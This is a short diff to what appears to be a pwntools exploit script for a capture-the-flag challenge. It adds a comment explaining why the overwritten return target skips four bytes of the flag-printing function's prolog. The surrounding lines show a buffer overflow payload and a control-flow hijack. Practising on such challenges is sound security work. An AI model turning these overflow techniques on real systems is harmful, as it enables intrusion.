@@ -92,6 +92,7 @@ def do_EL1(p):
     p.sendline('0')
     p.sendline('A'*0x100 + p64(mmap_buffer_start+0x10))
 
+    # +4 to skip prolog of print_flag to prevent infinite loop
     p.send(p64(0x4141414142424242) + p64(print_el1_flag+4))
     p.send("\x94") 
 
